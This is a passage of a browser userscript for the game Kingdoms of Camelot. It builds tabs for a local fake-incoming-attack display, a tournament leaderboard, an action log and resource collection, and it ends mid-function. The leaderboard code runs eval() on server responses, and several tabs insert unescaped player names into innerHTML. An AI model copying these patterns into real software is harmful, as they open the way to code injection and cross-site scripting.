	var m = '<div class=pdxStat>'+culang.Hfakeack+'</div><DIV id=testDiv ><table class=pdxTab width="721" border="0" cellspacing="0" cellpadding="0">	<tr>	<td width="24"><input  type="checkbox" id="fakeIsScout" /></td>	<td width="230">'+culang.FTscoutatk+'</td>	<td width="30"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_1_50_s34.jpg" width="30" height="30" /></td>	<td width="36"><input type="text" id="fakeSupply" value="0" size="6" /></td>	<td width="174">'+culang.supplytroop+'</td>	<td width="30"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_7_50_s34.jpg" width="30" height="30" /></td>	<td width="36"><input  type="text" id="fakeCav" value="0" size="6" /></td>	<td width="161">'+culang.cavalry+'</td></tr>	<tr>	<td><input type="checkbox" id="fakeIsWild" /></td>	<td>'+culang.FTatkwild+'</td>	<td><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_2_50_s34.jpg" width="30" height="30" /></td>	<td><input  type="text" id="fakeMilitia" value="5000" size="6" /></td>	<td>'+culang.militiaman+'</td>	<td><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_8_50_s34.jpg" width="30" height="30" /></td>	<td><input  type="text" id="fakeHeavy" value="0" size="6" /></td>	<td>'+culang.heavycavalry+'</td></tr>	<tr>	<td><input type="checkbox" disabled="disabled" id="fakeFalse" /></td>	<td>'+culang.fake+' '+culang.shrreport+'</td>	<td><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_3_50_s34.jpg" width="30" height="30" /></td>	<td><input  type="text" id="fakeScout" value="0" size="6" /></td>	<td>'+culang.scout+'</td>	<td><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_9_50_s34.jpg" width="30" height="30" /></td>	<td><input type="text" id="fakeWagon" value="0" size="6" /></td>	<td>'+culang.supplywagon+'</td></tr>	<tr>	<td>&nbsp;</td>	<td>'+culang.seconds+': 	<input type="text" id="fakeSeconds" value="300" size="4" /></td>	<td><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_4_50_s34.jpg" width="30" height="30" /></td>	<td><input type="text" id="fakePike" value="0" size="6" /></td>	<td>'+culang.pikeman+'</td>	<td><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_10_50_s34.jpg" width="30" height="30" /></td>	<td><input type="text" id="fakeBallista" value="0" size="6" /></td>	<td>'+culang.ballista+'</td>\	\	</tr>	<tr>	<td>&nbsp;</td>	<td>'+culang.fake+' '+culang.name+'</td>	<td><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_5_50_s34.jpg" width="30" height="30" /></td>	<td><input  type="text" id="fakeSword" value="0" size="6" /></td>	<td>'+culang.swordsman+'</td>	<td><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_11_50_s34.jpg" width="30" height="30" /></td>	<td><input  type="text" id="fakeRam" value="0" size="6" /></td>	<td>'+culang.batteringram+'</td></tr>	<tr>	<td>&nbsp;</td>	<td><input  type="text" id="fakeName" value="'+culang.FTattack+'" size="13" /></td>	<td><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_6_50_s34.jpg" width="30" height="30" /></td>	<td><input  type="text" id="fakeArcher" value="0" size="6" /></td>	<td>'+culang.archer+': </td>	<td><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_12_50_s34.jpg" width="28" height="28"></td>	<td><input  type="text" id="fakeCat" value="0" size="6" /></td>	<td>'+culang.catapult+'</td></tr>	<tr><td>&nbsp;</td><td><input  type="submit" id="ptReloadKOC" value="Refresh KoC"></td>	<td colspan="5">'+culang.target+': '+citySelect+'</td><td><input  type="submit" id="testSendMarch" value="'+culang.FTattackbtn+'"></td></tr>	</table></div>';
    
	t.cont.innerHTML = m;
    document.getElementById('testSendMarch').addEventListener ('click', t.clickFakeAttack, false);
    document.getElementById('ptReloadKOC').addEventListener ('click', t.reloadKOC, false);
    function xyNotify(city, x, y){
      var m = '[ Notiz: '+ (city?city.name:'null') +', x='+ x +', y='+ y +' ]';
      document.getElementById('testNotify').innerHTML = m;
    }
  },

  hide : function (){
        var t = Tabs.F;
        mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },

  show : function (){
        var t = Tabs.F;
        mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },
  
  reloadKOC : function (){
    window.location.href = '';
    setTimeout (function (){window.location.href = window.location.href +'&rload=3';}, 0);
    var goto = 'http://apps.facebook.com/kingdomsofcamelot/?s='+getServerId();
    var t = '<FORM target="_top" action="'+ goto +'" method=post><INPUT id=xxButReload type=submit value="'+culang.FTreloadbtn+'"><INPUT type=hidden name=s value="'+ getServerId() +'"</form>';
    var e = document.createElement ('div');
    e.innerHTML = t;
    document.body.appendChild (e);
    setTimeout (function (){document.getElementById('xxButReload').click();}, 0);
  },
  
  writeDiv : function (msg){
    var t = Tabs.F
    if (t.state != null)
      document.getElementById('testDiv').innerHTML = msg;
  },

  addDiv : function (msg){
    var t = Tabs.F;
    if (t.state != null)
      document.getElementById('testDiv').innerHTML += msg;
  },

  createFakeAttack : function (cityNum, isScout, isWild, isFalse, secs, numMilitia, numSupply, numPike,numSword,numArcher,numCav,numHeavy,numWagon,numBallista,numRam,numCat,numScout, name){
    var marchId = 'm'+ (88888 + Math.floor(Math.random()*11111));
    var march = {};
    if (matTypeof(Seed.queue_atkinc)=='array')
      Seed.queue_atkinc = {};
    if (isFalse)
      march.marchType = 0;
    else if (isScout)
      march.marchType = 3;
    else
      march.marchType = 4;

    march.toCityId = Cities.cities[cityNum].id;
    if (isWild) {
      keys = unsafeWindow.Object.keys(Seed.wilderness['city'+Cities.cities[cityNum].id]);
      march.toTileId = Seed.wilderness['city'+Cities.cities[cityNum].id][keys[0]].tileId;
    } else {
      march.toTileId = Cities.cities[cityNum].tileId;
    }
    secs = parseInt(secs);
	march.arrivalTime = unixTime() + secs;
	march.departureTime = unixTime() - 10;
	march.unts = {}
	  if(numScout != 0)
		march.unts.u3 = numScout
	  if(numMilitia != 0)
		march.unts.u2 = numMilitia
	  if(numSupply != 0)
	  march.unts.u1 = numSupply
	  if(numPike != 0)
	  march.unts.u4 = numPike
	  if(numSword != 0)
	  march.unts.u5 = numSword
	  if(numArcher != 0)
	  march.unts.u6 = numArcher
	  if(numCav != 0)
	  march.unts.u7 = numCav
	  if(numHeavy != 0)
	  march.unts.u8 = numHeavy
	  if(numWagon != 0)
	  march.unts.u9 = numWagon
	  if(numBallista != 0)
	  march.unts.u10 = numBallista
	  if(numRam != 0)
	  march.unts.u11 = numRam
	  if(numCat != 0)
	  march.unts.u12 = numCat
    march.pid = 1234567
    march.score = 9
    march.mid = marchId.substr(1);
    march.players = {}
    march.players.u1234567 = {}
    march.players.u1234567.n = name;
    march.players.u1234567.t = 60
    march.players.u1234567.m = 5441192
    march.players.u1234567.s = 'M';
    march.players.u1234567.w = 1
    march.players.u1234567.a = 1
    march.players.u1234567.i = 5
    Seed.queue_atkinc[marchId] = march;
    Seed.players.u1234567 = march.players.u1234567;
  },

  clickFakeAttack : function (){
    var t = Tabs.F;
	var isScout = document.getElementById('fakeIsScout').checked;
	var isWild = document.getElementById('fakeIsWild').checked;
	var isFalse = document.getElementById('fakeFalse').checked;
	var secs = parseInt(document.getElementById('fakeSeconds').value);
	var mil = parseInt(document.getElementById('fakeMilitia').value);
	var numSupply = parseInt(document.getElementById('fakeSupply').value);
	var numPike = parseInt(document.getElementById('fakePike').value);
	var numSword = parseInt(document.getElementById('fakeSword').value);
	var numArcher = parseInt(document.getElementById('fakeArcher').value);
	var numCav = parseInt(document.getElementById('fakeCav').value);
	var numHeavy = parseInt(document.getElementById('fakeHeavy').value);
	var numWagon = parseInt(document.getElementById('fakeWagon').value);
	var numBallista = parseInt(document.getElementById('fakeBallista').value);
	var numRam = parseInt(document.getElementById('fakeRam').value);
	var numCat = parseInt(document.getElementById('fakeCat').value);
	var numScout = parseInt(document.getElementById('fakeScout').value);
	var name = document.getElementById('fakeName').value;
	var city = document.getElementById('fakeCity').value;
	t.createFakeAttack (city, isScout, isWild, isFalse, secs, mil, numSupply, numPike,numSword,numArcher,numCav,numHeavy,numWagon,numBallista,numRam,numCat,numScout,name);

  },
}
/***********************************************************************************/
/************ KOC POWER - TABS TOURNAMENT *****************************************/
/*********************************************************************************/
Tabs.Tournament = {
	tabLabel : culang.tournament,
	tabOrder : StyleOptions.toTurnier,
	cont:null,
	displayTimer : null,
	tabDisabled : StyleOptions.disTourTab,
 
init : function (div){
var t = Tabs.Tournament;
t.cont = div;
//	   AddTowerTab('Turnier', t.showTournament, 10);
},

hide : function (){
var t = Tabs.Tournament;
clearTimeout (t.displayTimer);
},
getContent : function (){
	var t = Tabs.Tournament;
	return t.cont;
},
show : function () {
var t = Tabs.Tournament;
t.cont.style.overflowY = 'auto';
t.cont.style.maxHeight = '500px';
  clearTimeout (t.displayTimer);
  t.cont.innerHTML = "<div class='tourny_modal_upsell'></div>";
  var mhtl = "<DIV class=pdxStat>"+culang.HtourInfo+"</div><table width=100% class=pdxTab><tr><td colspan=8><center><b></td></tr><tr><td></td>";
  for(var i=0; i<Cities.numCities; i++) {
   mhtl += "<TD align=center valign=bottom width=60px><B>" + Cities.cities[i].name.replace(/ /g, "<BR>").substr(0,10) + "</B></TD>";
  }
  mhtl += "</tr><tr><td><img height=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_2_50_s34.jpg title="+culang.militiaman+"> "+culang.militiaman+"/"+culang.shrHour+"</td>";  var temps=[];  var temps=[];
  for(var i=0; i<Cities.numCities; i++) {
   temps[i]=((Cities.cities[i]['Troop2Time'] > 0)?(3600 / Cities.cities[i]['Troop2Time']):0);
   mhtl += "<td>" + addCommas(parseInt(temps[i])) +"</td>";
  }
    mhtl += "</tr><tr><td><img height=18 src=https://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/population_40.png title="+culang.pop+"> "+culang.pop+"/"+culang.shrHour+"</td>";  var pop=[];
  for(var i=0; i<Cities.numCities; i++) {
   cityID = 'city'+ Cities.cities[i].id;
   pop[i] =  parseInt(Seed.citystats[cityID]["pop"][1]) / 2;
   mhtl += "<td>" + addCommas(parseInt(pop[i])) +"</td>";
  }
  mhtl += "</tr><tr><td><b>"+culang.diff+"</b></td>";
  var diff=0;
  for(var i=0; i<Cities.numCities; i++) {
   diff = parseInt(pop[i] - temps[i]);
   var couleur=" style='font-color:green' ";
   if (diff<0) couleur=" style='background-color:red' ";
   mhtl += "<td "+couleur+"><b>" + addCommas(parseInt(diff)) +"</b></td>";
  }
  
   mhtl += "</tr><tr><td><img height=18 src=https://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/happiness.png title="+culang.luck+"> "+culang.luck+"</td>";
   for(var i=0; i<Cities.numCities; i++) {
   cityID = 'city'+ Cities.cities[i].id;
   var bon = parseInt(Seed.citystats[cityID]["pop"][2]); 
   var bonc = "red";
   if (bon>99) bonc="green";
   mhtl += "<td style='background-color:"+bonc+"'><center><b>"+bon+"</td>";
  }
  var now = unixTime();
  mhtl += "</tr><tr><td><img height=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/koc/barracks-small.png title='"+culang.que+"'> "+culang.que+"</td>";
    for(var i=0; i<Cities.numCities; i++) {
     cityID = 'city'+ Cities.cities[i].id;
     var totTime = 0;
     var q = Seed.queue_unt[cityID]; 
     if (q!=null && q.length>0)
         totTime = q[q.length-1][3] - now;
     if (totTime < 0) totTime = 0;
     if (totTime < 3600)
      var bonc="style='background-color:red'";
     else
      var bonc="";
     mhtl += "<td "+bonc+"><center><b>"+timestr(totTime)+"</td>";
    }
    
  mhtl += "</tr></table><br>";
  t.cont.innerHTML += mhtl;
  var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  params.format=2;
  params.tournyPos=0;
  new AjaxRequest(unsafeWindow.g_ajaxpath+"ajax/getLeaderboard.php"+unsafeWindow.g_ajaxsuffix, {  method:"post",  parameters:params,
  
  onSuccess:function(transport){
   var rslt=eval("("+transport.responseText+")");
   if(rslt.ok){
   
    if(!rslt.data){
	   
	t.cont.innerHTML +="<div class=pdxStat>"+culang.HtourChk+"</div><div class='tourny_modal_upsell'><br><center><b>"+unsafeWindow.g_js_strings.modal_tourny_changetab.notourny+"</b></center></div>";
	    
    }else{ //  rslt.data
     var tournyhtml=new Array();
     
     if(rslt.name){
	    tournyhtml.push("<div class=pdxStat style='font-variant: small-caps;'>"+rslt.name.replace('The Tournament of Might',''+culang.TmTabToM+'')+"</div>")
     }  else{
	    tournyhtml.push("<div class='tournymodaltitle'><center>1"+unsafeWindow.g_js_strings.commonstr.tournament+"</div>")
     }
	   tournyhtml.push("<div>");
	   
	   if(rslt.startdate&&rslt.enddate){
	   	   	    var startTime=rslt.startdate;
	   	   	    var endTime=rslt.enddate;
	   	   	    var now=parseInt(new Date().getTime()/1000);
	   	   	    tournyhtml.push("<table width=100% align=center class=pdxTab><tr><td width=40%><b><u>"+culang.TmTabStarts+"</b></u></td><td width=40%><b><u>"+culang.TmTabEnds+"</b></u></td><td width=20%><b><u>"+culang.TmTabEnds+"</b></u></td></tr>");
	   	   	    dt = new Date ();
	   	            dt.setTime (startTime * 1000);
	   	            dtf = new Date ();
	   	            dtf.setTime (endTime * 1000);
	   	           
	   	            var restant = endTime - now; 
	   	            
	   	   	   
	   	   	   tournyhtml.push("<tr><td>");
	   	   	     tournyhtml.push("<span class=boldGreen>" + dt.toLocaleDateString() + " - "+ dt.toLocaleTimeString()+ "</span>");
	   	   	    tournyhtml.push("</td><td>");
	   	   	    tournyhtml.push("<span class=boldGreen>" + dtf.toLocaleDateString()+ " - "+ dtf.toLocaleTimeString() + "</span>");
	   	   	    tournyhtml.push("</td><td><span class=boldRed>"+timestr(restant,1)+"</span></td></tr></table>");
	   	     tournyhtml.push("<br>");
	   
	   }
	   
	   tournyhtml.push("<center><table class='tourny_list_table' cellpadding='0' cellspacing='0' border='0' width=90% style='margin:5px'>");
	   tournyhtml.push("<thead>");
	   tournyhtml.push("<tr>");
     if(rslt.type==24){
	    tournyhtml.push("<td class='rankcol' style='background-color:red'>");
	    tournyhtml.push("<div><input type=button id='BOTournoiPM' value='"+culang.minimize+"'>&nbsp;"+unsafeWindow.g_js_strings.commonstr.ranking+"</div>");
	    tournyhtml.push("</td>");
	    tournyhtml.push("<td  style='background-color:red'>");
	    tournyhtml.push("<div>"+culang.chancellorname+"</div>");
	    tournyhtml.push("</td>");
	    tournyhtml.push("<td  style='background-color:red'>");
	    tournyhtml.push("<div>"+unsafeWindow.g_js_strings.commonstr.alliance+"</div>");
	    tournyhtml.push("</td>");
	    tournyhtml.push("<td  style='background-color:red'>");
	    tournyhtml.push("<div>"+unsafeWindow.g_js_strings.modal_tourny_changetab.mightgained+"</div>");
	    tournyhtml.push("</td  style='background-color:red'>");
	    tournyhtml.push("<td  style='background-color:red'> ");
	    tournyhtml.push("<div>"+unsafeWindow.g_js_strings.modal_tourny_changetab.rewardperplayer+"</div>");
	    tournyhtml.push("</td>")
      }else{
            tournyhtml.push("<td	class='rankcol' style='background-color:red'>");
	    tournyhtml.push("<div><input type=button id='BOTournoiPM' value='"+culang.minimize+"'>&nbsp;"+unsafeWindow.g_js_strings.commonstr.ranking+"</div>");
	    tournyhtml.push("</td>");
	    tournyhtml.push("<td  style='background-color:red'>");
	    tournyhtml.push("<div>"+culang.player+"</div>");
	    tournyhtml.push("</td>");
	    tournyhtml.push("<td  style='background-color:red'>");
	    tournyhtml.push("<div>"+unsafeWindow.g_js_strings.commonstr.alliance.replace+"</div>"); //('Might Change',''+culang.TmTabMChange+'')
	    tournyhtml.push("</td>");
	    tournyhtml.push("<td  style='background-color:red'>");
	    tournyhtml.push("<div>"+rslt.contestcategory+"</div>");
	    tournyhtml.push("</td>");
	    tournyhtml.push("<td  style='background-color:red'>");
	    tournyhtml.push("<div>"+unsafeWindow.g_js_strings.commonstr.reward+"</div>");
	    tournyhtml.push("</td>")
     }
	   tournyhtml.push("</tr>");
	   tournyhtml.push("</thead>");
	   tournyhtml.push("</tbody>");
	   var nb=rslt.data.length;
	   var votrepuissance = 0;
	   for(var i=0;i<rslt.data.length;i++){
	    var row=rslt.data[i];
	    if(rslt.type==24){ // Tournament
	     if (getMyAlliance()[1] == row.alliance) {
	      votrepuissance=row.contestValue;
	      break;
	     }
	    } else {
	     if (Seed.player.prefix + ' '+ Seed.player.name == row.name ) {
	      votrepuissance=row.contestValue;
	      break;
	     }	
	    }
	   }
	   for(var i=0;i< Options.TournoiLigne;i++){
	    var row=rslt.data[i];
	    var rewardString=row.itemCount+" ";
	    if(row.itemType==0){
	     rewardString+=unsafeWindow.g_js_strings.commonstr.gems;
	    }else{
	     rewardString+=unsafeWindow.itemlist["i"+row.itemType].name;
	    }
	    var couleur="";
	    if(rslt.type==24){ //Alliance Tournament
	     if (getMyAlliance()[1] == row.alliance) {
	      couleur=" style='background-color:"+Colors.Tourn+"' ";
	     }
	    }else{
	     if (Seed.player.prefix + ' '+ Seed.player.name == row.name ) {
	      couleur=" style='background-color:"+Colors.Tourn+"' ";
	     }
	    }
	    if(i%2==1){
	     tournyhtml.push("<tr>")
	    }else{
	     tournyhtml.push("<tr class='stripe'>")
	    }
	    tournyhtml.push("<td class='rankcol' "+couleur+">");
	    tournyhtml.push("<div><b>"+row.ranking+"</b></div>");
	    tournyhtml.push("</td>");
	    tournyhtml.push("<td "+couleur+">");
	    tournyhtml.push("<div>"+row.name+"</div>");
	    tournyhtml.push("</td>");
	    tournyhtml.push("<td "+couleur+">");
	    tournyhtml.push("<div>"+(row.alliance||"----")+"</div>");
	    tournyhtml.push("</td>");
	    tournyhtml.push("<td "+couleur+">");
	    tournyhtml.push("<div>"+addCommas(row.contestValue));
	    if (votrepuissance>0) {
	      var ecartavecvous = parseInt(row.contestValue - votrepuissance);
	      if (ecartavecvous>0) {
	       tournyhtml.push("&nbsp;(+ " + addCommas(ecartavecvous) +")");
	      } 
	      if (ecartavecvous<0) {
	       tournyhtml.push("&nbsp;(" + addCommas(ecartavecvous) +")");
	      }
	    }
	    tournyhtml.push("</div>");
	    tournyhtml.push("</td>");
	    tournyhtml.push("<td "+couleur+">");
	    tournyhtml.push("<div>"+rewardString+"</div>");
	    tournyhtml.push("</td>");
	    tournyhtml.push("</tr>")
	   }
	   
	      if(rslt.type!=24){

	    for(var i= Options.TournoiLigne;i<rslt.data.length;i++){
	   	    var row=rslt.data[i];
	   	 
	   	    if (Seed.player.prefix + ' '+ Seed.player.name == row.name ) {
	   	      var rewardString=row.itemCount+" ";
	   	     	    if(row.itemType==0){
	   	     	     rewardString+=unsafeWindow.g_js_strings.commonstr.gems;
	   	     	    }else{
	   	     	     rewardString+=unsafeWindow.itemlist["i"+row.itemType].name;
	   	     	    }
	   	     	    tournyhtml.push("<tr class='stripe' >")
	   	     	    tournyhtml.push("<td class='rankcol' style='background-color:"+Colors.Tourn+"'>");
	   	     	    tournyhtml.push("<div><b>"+row.ranking+"</b></div>");
	   	     	    tournyhtml.push("</td>");
	   	     	    tournyhtml.push("<td style='background-color:"+Colors.Tourn+"'>");
	   	     	    tournyhtml.push("<div>"+row.name+"</div>");
	   	     	    tournyhtml.push("</td>");
	   	     	    tournyhtml.push("<td style='background-color:"+Colors.Tourn+"'>");
	   	     	    tournyhtml.push("<div>"+(row.alliance||"----")+"</div>");
	   	     	    tournyhtml.push("</td>");
	   	     	    tournyhtml.push("<td style='background-color:"+Colors.Tourn+"'>");
	   	     	    tournyhtml.push("<div>"+addCommas(row.contestValue)+"</div>");
	   	     	    tournyhtml.push("</td>");
	   	     	    tournyhtml.push("<td style='background-color:"+Colors.Tourn+"'>");
	   	     	    tournyhtml	.push("<div>"+rewardString+"</div>");
	   	     	    tournyhtml.push("</td>");
	   	            tournyhtml.push("</tr>")
	   	   }    
	   }
	   }
	   tournyhtml.push("</tbody>");
	   tournyhtml.push("</table>");
      tournyhtml.push("</div>");
      t.cont.innerHTML += tournyhtml.join("");      
           document.getElementById('BOTournoiPM').addEventListener ('click', function() { 
            var lg=rslt.data.length;
            if (rslt.type!=24) lg=25;
            t.plusmoins(lg);
           }, false);      
           
           if ((Options.TournoiLigne==5 && rslt.type!=24) || (Options.TournoiLigne==5 && rslt.type==24)) {
	        document.getElementById('BOTournoiPM').value=""+culang.maximize+"";
	    } else {
	        document.getElementById('BOTournoiPM').value=""+culang.minimize+"";           
        }
          } // fin rslt.data 
         } else {
            t.cont.innerHTML = "<div class='tourny_modal_upsell'><center>"+culang.TmTabNoInfo +"</div>";
         }
       }, onFailure:function()  {
         t.cont.innerHTML = "<div class='tourny_modal_upsell'><center>"+culang.TmTabNoInfo +"</div>";
       }
   });
   t.displayTimer = setTimeout (t.show, 240000);       
  },
  plusmoins: function(lg) {
   var t = Tabs.Tournament;
   if (document.getElementById('BOTournoiPM').value==""+culang.maximize+"") {
     document.getElementById('BOTournoiPM').value=""+culang.minimize+"";
     Options.TournoiLigne = lg;
   } else {
     document.getElementById('BOTournoiPM').value=""+culang.maximize+"";
     Options.TournoiLigne = 5;
   }
   saveOptions();
   clearTimeout (t.displayTimer);
   t.show();
  },  
/* 			
checktourney: function() {
			 var t = Tabs.Tournament;
			  var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
			params.format=2;
			params.tournyPos=0;
			new AjaxRequest(unsafeWindow.g_ajaxpath+"ajax/getLeaderboard.php"+unsafeWindow.g_ajaxsuffix, {  
			  method:"post",  parameters:params,
				  
			onSuccess:function(transport){
			var rslt=eval("("+transport.responseText+")");
			if(rslt.name){
			 var t = Tabs.Tournament;
			   AddTowerTab('Turnier', t.showTournament, 10);
			};		  
			},
			   });	  
			},
			showTournament: function() {
				 // Options.currentTab = culang.tournament;   
				   // saveOptions();
			mainPop.show (true);
					// setTimeout(function(){document.getElementById('pbtc'+culang.tournament).e_clickedTab}, 3000);
			 // tabManager.e_clickedTab(e);
			}, 
			*/

}
/***********************************************************************************/
/************ KOC POWER - TABS ACTION LOG *****************************************/
/*********************************************************************************/
Tabs.ActionLog = {
  tabOrder: StyleOptions.toLog,
  tabDisabled : !ENABLE_INFO_TAB, // if true, tab will not be added or initialized
  tabLabel : culang.log,
  myDiv : null,
  logTab : null,
  maxEntries: 300,
  last50 : [],
  state : null,

  init : function (div){
    var t = Tabs.ActionLog;
    t.myDiv = div;
    t.myDiv.innerHTML = '<DIV class=pdxStat>'+culang.HaLog+'</div><DIV style="height:535px; max-height:635px; overflow-y:auto">\
      <TABLE cellpadding=0 cellspacing=0 id=pbactionlog class=pdxTabLined><TR><TD></td><TD width=100%></td></table></div>';
    t.logTab = document.getElementById('pbactionlog');
    t.state = 1;
    var a = JSON2.parse(GM_getValue ('log_'+getServerId(), '[]'));
    if (matTypeof(a) == 'array'){
      t.last50 = a;
      for (var i=0; i<t.last50.length; i++)
        t._addTab (t.last50[i].msg, t.last50[i].ts);
    }
    window.addEventListener('unload', t.onUnload, false);
  },

  hide : function (){
     var t = Tabs.ActionLog;
    mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },

  show : function (){
     var t = Tabs.ActionLog;
    mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },

  onUnload : function (){
    var t = Tabs.ActionLog;
    if (!ResetAll) GM_setValue ('log_'+getServerId(), JSON2.stringify(t.last50));
  },

  _addTab : function (msg, ts){
    var t = Tabs.ActionLog;
    if (t.state != 1)
      return;
    if (t.logTab.rows.length >= t.maxEntries)
      t.logTab.deleteRow(t.maxEntries-1);
    var row = t.logTab.insertRow(0);
    row.vAlign = 'top';
    row.insertCell(0).innerHTML = ts;
    row.insertCell(1).innerHTML = msg;
  },

  log : function (msg){
    var t = Tabs.ActionLog;
    var ts = new Date().toTimeString().substring (0,8);
    t._addTab (msg, ts);
    while (t.last50.length >= 50)
      t.last50.shift();
    t.last50.push ({msg:msg, ts:ts});
  },
}
function actionLog (msg){
  if (!Tabs.ActionLog.tabDisabled)
    Tabs.ActionLog.log (msg);
}
/***********************************************************************************/
/************ KOC POWER - TABS RESSOURCES *****************************************/
/*********************************************************************************/
Tabs.Resources = {
  tabLabel : culang.resource,
  tabOrder : StyleOptions.toRessis,
   tabDisabled : StyleOptions.disResTab,
  resource : {1:''+culang.food+'', 2:''+culang.wood+'', 3:''+culang.stone+'', 4:''+culang.ore+''},
  users : [],
  myDiv : null,
  doList : [], // list of gifts to accept
  accepting : true,
  city : null,
  total : {gold:0, 1:0, 2:0, 3:0, 4:0},
   
  init : function (div){
    var t = Tabs.Resources;
		t.myDiv = div;
		 t.myDiv.style.overflowY = 'auto';
    div.innerHTML = '<DIV class=pdxStat>'+culang.Hvisit+'</div><TABLE cellpadding=0 cellspacing=0 class=pdxTab width=100%><TR><TD align=center><INPUT id="pballlist" type=submit value="'+culang.srcplayr+'" \></td></tr></table>\
        <DIV id=resDiv >';
    document.getElementById('pballlist').addEventListener ('click', t.e_clickfetchlist, false);

  },
  
  show : function (){
  var t = Tabs.Resources;
  mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },
  hide : function (){
  var t = Tabs.Resources;
  mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },
  
  progress : function (msg, span, add){
	if(add)
		document.getElementById(span).innerHTML+=msg;
	else
		document.getElementById(span).innerHTML=msg;
  },

  e_clickfetchlist : function  (){ // (also cancel accepting)
    var t = Tabs.Resources;
	t.users = [];
    if (t.accepting){
      document.getElementById('pballlist').value = ''+culang.srcplayr+'';
      document.getElementById('resDiv').innerHTML+= '<BR><SPAN class=boldRed>'+culang.canceled+'.</span>';
      t.accepting = false;
      return;
    }
    document.getElementById('resDiv').innerHTML = '<div class=pdxStat>'+culang.Hplycourts+'</div><BR><b><CENTER>'+culang.searchplylist+' <b><font color=#600000> <span id=pbResUserListCount></span> </b></font></center></b>';
    
    t.fetchUserList (gotUserList);
    function gotUserList(userList){
		if(userList.length < 1){
			listGifts();
			return;
		}
		document.getElementById('resDiv').innerHTML += '<b><CENTER>'+culang.searchcourts+' <b><font color=#600000><span id=pbResUserAvailCount></span> </b></font></center></b>';
		t.checkDailyAction(userList, listGifts);
	}
    
    function listGifts (){
	  t.city = Cities.cities[0];
	  var m = '<DIV class=pdxStat><CENTER>'+culang.Hplycourts+': '+ t.users.length +' </center></div>';
      if (t.users.length<1){
        document.getElementById('resDiv').innerHTML = m + '<BR><BR><CENTER><b>'+culang.noplayerfound+' </b></center>';
        return;
      }
      m += '<TABLE class=pdxTab align=center><TR><TD align=right><b>'+culang.heiligtum+'</b>: </td><TD id=pbrescityselspan></td></tr>\
          <TR><TD align=right>'+culang.CTwhatres+'</td><TD>'
        + htmlSelector (t.resource, Options.getResType, 'id=pbResColType')
        + '</td></tr><TR><TD>'+culang.CTvisitc+' '+culang.CTvisitbtn+' '+culang.CTvisitc2+': </td><TD width=250><INPUT type=submit id=pbResDo value="'+culang.CTvisitbtn+'">\
        &nbsp; <SPAN id=pbResNone class=boldRed></span></td></tr></table><HR><center><TABLE class=pdxTab><TR valign=top><TD>\
        <INPUT id=pbResButAll type=submit value="'+culang.all+'" style="width:100%; margin-bottom:5px"><BR><INPUT id=pbResButNone type=submit value="'+culang.none+'"></td>\
        <TD width=10></td><TD><TABLE align=center cellpadding=0 cellspacing=0 class=pdxTabLined>\
        <TBODY  id=pbResTbody style="height:250px; overflow:auto; display:block;">\
        <TR style="font-weight:bold;"><TD>'+culang.name+'</td><TD>'+culang.might+'</td><TD width=20></td></tr>';
      for (var i=0; i<t.users.length; i++){
        m += '<TR><TD><INPUT type=checkbox id=pbrchk_'+ i +'> &nbsp;'+ t.users[i].name +'</td><TD>'+ t.users[i].might +'</td></tr>';
      }
      document.getElementById('resDiv').innerHTML = m + '</tbody></table></center></td></tr></table>';
	  new CdispCityPicker ('pbrescitysel', document.getElementById('pbrescityselspan'), true, t.e_CityButton, t.city.idx);
      document.getElementById('pbResDo').addEventListener ('click', t.getErDone, false);
      document.getElementById('pbResButAll').addEventListener ('click', t.e_butAll, false);
      document.getElementById('pbResButNone').addEventListener ('click', t.e_butNone, false);
    }
  },

  e_CityButton : function (city, x, y){
    var t = Tabs.Resources;
	t.city = city;
  },
  
 e_butAll : function (){
		var t = Tabs.Resources;
		for (var i=0; i<t.users.length; i++)
		  document.getElementById('pbrchk_'+i).checked = true;
	  },
	  
	  e_butNone : function (){
		var t = Tabs.Resources;
		for (var i=0; i<t.users.length; i++)
		  document.getElementById('pbrchk_'+i).checked = false;
	  },
	  
	  getErDone : function (){
		var t = Tabs.Resources;
		t.doList = [];
		document.getElementById('pbResNone').innerHTML = '';
		Options.getResType = document.getElementById('pbResColType').value;
		t.total = {gold:0, 1:0, 2:0, 3:0, 4:0};
		for (var i=0; i<t.users.length; i++){
		  if (document.getElementById('pbrchk_'+i).checked)
			t.doList.push (t.users[i]);
		}
		if (t.doList.length==0){
		  document.getElementById('pbResNone').innerHTML = ''+culang.noselplyr+'';
		  return;
		}
		t.accepting = true;
		document.getElementById('pballlist').value = ''+culang.GTstopAcc+'';
